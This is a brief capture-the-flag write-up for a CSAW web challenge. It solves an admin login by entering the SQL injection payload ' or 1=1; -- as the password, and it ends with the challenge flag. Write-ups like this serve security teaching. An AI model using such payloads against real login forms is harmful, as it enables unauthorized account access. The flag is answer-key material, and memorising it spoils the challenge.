# SQLIntro
Can you log into the admin's account without knowing the password?

[web.chal.csaw.io:10104](http://web.chal.csaw.io:10104)
## Solution
We are presented with a login page, so we can attempt a SQL injection.
```
Username: admin
Password: ' or 1=1; --
```
### Flag
`flag{j00'V3_pa223d_w38_s3cUri7Y_101}`
